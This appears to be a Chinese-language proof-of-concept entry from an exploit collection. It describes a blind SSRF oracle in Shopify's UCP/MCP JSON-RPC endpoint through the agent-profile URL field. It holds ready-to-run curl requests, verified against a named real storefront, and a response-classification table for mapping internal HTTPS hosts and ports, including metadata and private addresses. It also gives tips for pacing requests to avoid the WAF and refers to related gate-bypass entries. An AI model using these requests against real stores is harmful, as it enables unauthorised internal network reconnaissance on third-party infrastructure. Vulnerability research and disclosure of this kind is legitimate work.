# Shopify UCP/MCP /api/ucp/mcp 的 meta.ucp-agent.profile 被服务端主动抓取 → 盲 SSRF 存活/端口 oracle（错误分类差分）

- **code**: shopify-ucp-mcp-agent-profile-blind-ssrf-oracle
- **kind**: poc
- **category**: ssrf
- **component**: Shopify UCP / MCP (JSON-RPC 2.0 /api/ucp/mcp)
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 14:53-14:56 UTC 本机 curl 直发 JSON-RPC 到 retro32（www.retro32.com 对应的 Shopify 后端 cns21d-0u.myshopify.com）/api/ucp/mcp（finding#69，verdict=verified）。① initialize → HTTP 200，result.serverInfo.name 含 UCP server 标识（capabilities.tools 存在），证明端点匿名可用；② 逐条 tools/call search_catalog 带不同 meta.ucp-agent.profile：profile=https://www.retro32.com/.well-known/ucp → status success（服务端确发起抓取并成功）；profile=https://shopify.dev/robots.txt → {"code":"profile_malformed","content":"...Invalid content type"}；profile=https://example.com/agent.json → "Http error"；profile=https://127.0.0.1/ → {"code":"profile_unreachable","content":"...Network error"}；profile=http://169.254.169.254/ → {"code":"invalid_profile_url","content":"...Https required"}。四种结果稳定可区分 → 判定成立：构成对内部 HTTPS 主机的盲 SSRF 存活/端口 oracle（非回显型，读不到响应体）。
- **path**: pocs/shopify-ucp-mcp-agent-profile-blind-ssrf-oracle/poc.md
- **tags**: shopify,ucp,mcp,ssrf,json-rpc,agent-profile,oracle,blind-ssrf,server-side-request,shopping
- **created_at**: 2026-11-11T15:03:32.859Z
- **engine**: https://cns21d-0u.myshopify.com/api/ucp/mcp（storefront www.retro32.com 的 Shopify 后端）

## 描述

Shopify 托管的 UCP/MCP 网关 POST /api/ucp/mcp 是一个匿名可达的 JSON-RPC 2.0 端点。每次 tools/call 的 arguments.meta.ucp-agent.profile 会被服务端主动发起 HTTP(S) 请求去抓取（本意是取 agent profile 文档）。由于该 URL 完全由调用方控制、且服务端把抓取失败原因按类别回显，攻击者可把任意内部/外部地址塞进去，用错误分类差异（success / Http error / Invalid content type / Network error / Https required）当盲 SSRF oracle，探测内网 HTTPS 主机与端口的存活、以及目标是否返回 JSON。限制：只接受 https scheme、不跟随 302、不回显响应体，故只能做存活/端口判定，读不到内网内容。与库内 #518/#528 是同一字段的另一面（把 profile 指向店铺自身 .well-known/ucp 可绕门禁写 Cart/Checkout）。

## 用法

```
前置：目标为 Shopify 托管店且开放 UCP/MCP（GET https://<shop>/.well-known/ucp 返回 200 JSON，响应头 powered-by: Shopify）。无需 Cookie/JWT，请求头必须同时带 Content-Type: application/json 与 Accept: application/json, text/event-stream；WAF 按速率触发 → 单线程、请求间隔 ≥2.5s。

# 0) 探活端点（应 200，result.serverInfo 含 UCP 标识）
curl -sk -X POST 'https://<shop>.myshopify.com/api/ucp/mcp' \
  -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"t","version":"1"}}}'

# 1) 盲 SSRF oracle：把任意 URL 塞进 meta.ucp-agent.profile，看错误分类
curl -sk -X POST 'https://<shop>.myshopify.com/api/ucp/mcp' \
  -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"search_catalog","arguments":{"meta":{"ucp-agent":{"profile":"https://<任意URL>"}},"catalog":{"query":"test"}}}}'

判据（差分表，稳定可复现）：
  profile=https://<shop>/.well-known/ucp      -> status success          （连通且返回合规 JSON）
  profile=https://<host>/robots.txt           -> profile_malformed "Invalid content type"（连通，但非 JSON）
  profile=https://<host>/some.json            -> "Http error"           （连通，HTTP 层报错）
  profile=https://127.0.0.1/                  -> profile_unreachable "Network error"（连不上/DROP）
  profile=http://127.0.0.1/ 或 http://169.254.169.254/ -> invalid_profile_url "Https required"（scheme 被拒）

用法：把 profile 换成待探的内网 HTTPS 地址（如 https://10.0.0.5:8443/、https://169.254.169.254/xxx 需 https），按上面五类回显区分「端口开且是 JSON 服务 / 端口开但非 JSON / 端口开但 HTTP 报错 / 端口不可达」。换路径无意义（不回显 body、不跟随 302）。

失败常见原因：请求缺 Accept: application/json, text/event-stream；速率过快被 WAF 429/403；用了 http:// 会一律 "Https required"（先换 https）；目标是 self-hosted 非 Shopify 则无 /api/ucp/mcp。
```

## 正文

```
# Shopify UCP/MCP 的 meta.ucp-agent.profile → 服务端主动抓取，盲 SSRF 存活/端口 oracle

归类：server-side request validation（SSRF）
严重度：low
来源：task#12 retro32.com 全流程，finding_id=69（verdict=verified）
端点：POST https://<shop>.myshopify.com/api/ucp/mcp （JSON-RPC 2.0 over MCP）

## 一句话
UCP/MCP 网关匿名可达；每次 tools/call 的 arguments.meta.ucp-agent.profile 会被服务端主动发起 HTTP(S) 抓取。响应按「抓取结果」给出稳定差分，构成对任意内部 HTTPS 主机的**盲** SSRF 存活/端口 oracle（不回显响应体）。

## 前置条件
- 目标为 Shopify 托管店且开放 UCP/MCP：GET https://<shop>/.well-known/ucp → 200 JSON（powered-by: Shopify）
- 零凭据：不需要 Cookie / JWT / 账号
- 请求头必须同时带：Content-Type: application/json 与 Accept: application/json, text/event-stream
- WAF 按速率触发 → 单线程、请求间隔 ≥2.5s

## 复现链（实测）

### 步骤 0 — 探活端点（MCP 服务匿名可用）
```
POST /api/ucp/mcp HTTP/1.1
Host: <shop>.myshopify.com
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"t","version":"1"}}}
```
回显：200，result.serverInfo.name 含 UCP server 标识，capabilities.tools 存在。

### 步骤 1 — 塞入任意 URL 作为 profile，读回抓取结果分类
```
POST /api/ucp/mcp
{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"search_catalog",
 "arguments":{"meta":{"ucp-agent":{"profile":"https://<任意URL>"}},"catalog":{"query":"test"}}}}
```

### 差分判据表（四类回显稳定可区分）
| profile 值 | 回显 | 服务端实际行为 |
|---|---|---|
| https://<shop>/.well-known/ucp | status success | 连通，且返回合规 JSON profile |
| https://<host>/robots.txt | profile_malformed "Invalid content type" | 连通，但响应不是 JSON |
| https://<host>/something.json | "Http error" | 连通，HTTP 层报错 |
| https://127.0.0.1/ | profile_unreachable "Network error" | 连不上 / 端口 DROP |
| http://169.254.169.254/ | invalid_profile_url "Https required" | scheme 被拒（非 https） |

（cns21d-0u.myshopify.com 上原样复现；对应 retro32 的 Shopify 后端。）

## 判定要点
- 关键证据是「服务端确发起了抓取」：profile 指向店铺自身公开文档时 status=success，而同一请求改指向不可达/非 JSON/http 地址时回显错误分类发生可预测变化 → 服务端在按我们给的 URL 出网。
- oracle 能力 = 判断「内部主机:端口是否可达 + 是否 HTTPS/返回 JSON」，属盲 SSRF（无回显）。

## 边界（不要夸大）
- 仅接受 **https** scheme；http:// 一律 "Https required"（invalid_profile_url）。
- **不跟随 302 重定向**；HTTP 层错误统一归类为 "Http error"。
- **不回显响应体** → 读不到内网内容，只能做存活/端口/内容类型判定。
- 这是与库内 #518/#528 同一字段的**另一个利用面**：#518/#528 讲把 profile 指向店铺自身 .well-known/ucp 可自绕门禁调用写类工具；本条讲 profile 被服务端抓取所形成的 SSRF oracle。

## 失败时的常见原因
- 缺 Accept 头 / Content-Type 头 → 端点不正常响应。
- 请求过密被 WAF 拦（429/403，retry-after 可能很长）。
- 用了 http:// → 全部 "Https required"，先换 https。
- 目标是 self-hosted 非 Shopify → 无 /api/ucp/mcp（先 GET /.well-known/ucp 判存在）。
- 误把 "Http error" 当成「不可达」：它其实说明**端口是通的**，只是 HTTP 层报错。

```
